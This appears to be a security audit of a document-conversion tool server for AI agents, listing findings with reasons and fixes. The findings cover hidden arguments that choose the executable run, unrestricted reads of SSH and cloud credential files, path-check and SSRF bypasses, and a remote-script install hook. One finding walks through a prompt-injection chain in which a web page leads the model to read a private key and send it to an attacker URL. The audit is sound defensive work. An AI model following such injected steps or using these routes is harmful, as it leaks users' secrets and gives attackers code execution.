title: Tool arguments choose the executable that is run (uvPath / projectRoot)
reason: Every conversion tool accepts hidden uvPath and projectRoot arguments (not in the advertised schema, but parsed by the Zod schema) and execFile runs uvPath as the program, with projectRoot/.venv/bin/markitdown as the script; an injected call with uvPath set to any binary or script (e.g. a UNC path \\attacker\share\x.exe on Windows, or any planted file) gets code execution. execFile avoids shell parsing but not the choice of program.
fix: Remove uvPath and projectRoot from RequestPayloadSchema; take the uv path only from operator config (UV_PATH env / fixed default) and projectRoot only from the install directory.

title: Conversion tools read any file on disk and return its contents
reason: pdf/image/audio/docx/xlsx/pptx-to-markdown pass the filepath argument to markitdown with no directory restriction (MD_SHARE_DIR is only applied to get-markdown-file), and markitdown converts plain-text files too, so filepath=~/.ssh/id_rsa or ~/.aws/credentials returns the secret to the model.
fix: Resolve the path with fs.realpath, require it to be inside an allowed directory via path.relative (no leading '..'), check the extension matches the tool, and reject values starting with '-'.

title: get-markdown-file share-dir check is a prefix test on an unresolved path, and off by default
reason: Without MD_SHARE_DIR any .md/.markdown file on disk can be read; with it, startsWith without a trailing separator lets /share-evil/x.md pass for /share, symlinks inside the share are not resolved, and the read uses the raw filePath rather than the checked path. Limited to Markdown-extension files.
fix: Require MD_SHARE_DIR (or a default sandbox), realpath both the root and the target, check path.relative(root, target) does not start with '..' and is not absolute, and read the checked real path.

title: URL tools: private-IP check on the literal hostname only; DNS names and redirects bypass it
reason: The check only inspects the hostname string, so a domain that resolves to 127.0.0.1/169.254.169.254, or a public URL that 302-redirects to an internal address (fetch follows redirects by default), reaches internal services and cloud metadata and the response body is returned to the model.
fix: Resolve the hostname and reject private/loopback/link-local/IPv6-local addresses, connect to the checked IP, use redirect: 'manual' and re-check every hop, and cap response size and time.

title: Untrusted web content + arbitrary file read + outbound fetch in one server, no approval
reason: A web page converted by webpage-to-markdown can instruct the model to read ~/.ssh/id_rsa with a file tool (M002) and then call webpage-to-markdown with https://attacker/?d=<secret>, exfiltrating it; nothing requires user approval between steps.
fix: Fix M002 (restrict file reads to a sandbox), mark fetched content as untrusted data, and require human approval for URL fetches that follow file reads.

title: Fetched web/YouTube/Bing content returned raw to the model
reason: Converted third-party page text goes straight into the model context unmarked, which is how injected instructions reach the agent.
fix: Wrap returned content in clear untrusted-data delimiters and tell the client it is external content.

title: Unbounded fetch: no timeout or size limit
reason: Any URL is downloaded fully into memory and to disk with no size cap or timeout, so a huge or never-ending response exhausts memory/disk.
fix: Use an AbortController timeout and stop reading after a maximum byte count.

title: npm preinstall pipes a remote script to sh
reason: Installing the package runs an unpinned, unverified remote installer script; a compromised download host or proxy gets code execution on the installer's machine.
fix: Drop the preinstall hook and document installing uv separately, or download a pinned version and verify its checksum.
